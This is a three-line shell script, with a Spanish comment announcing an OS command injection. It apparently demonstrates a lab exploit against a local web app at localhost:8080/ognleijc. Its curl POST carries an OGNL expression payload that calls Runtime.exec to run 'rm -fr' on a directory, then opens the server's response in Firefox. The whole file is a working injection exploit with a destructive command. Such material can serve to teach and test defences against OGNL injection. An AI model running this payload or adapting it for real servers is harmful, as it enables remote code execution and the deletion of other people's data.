echo "Realizando un OS Command Injection"
curl -X POST -d "expression=@Runtime@getRuntime().exec('rm -fr /your-important-dir/')" localhost:8080/ognleijc > resultado_osCommandInjection.html
firefox resultado_osCommandInjection.html
